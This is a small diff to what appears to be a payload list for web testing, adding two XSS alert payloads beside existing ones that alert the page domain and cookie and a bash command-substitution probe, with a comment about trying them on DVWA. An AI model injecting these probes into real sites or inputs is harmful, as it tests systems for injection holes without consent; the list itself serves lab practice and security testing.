@@ -28,6 +28,8 @@ $(echo echo Test) #bash
 --# JS #--
 <script>alert(document.domain);</script>
 <script>alert(document.cookie);</script>
+<script>alert('test');</script>
+<script>window.alert('test');</script>
 
 #example try out on dwva:
 127.0.0.1
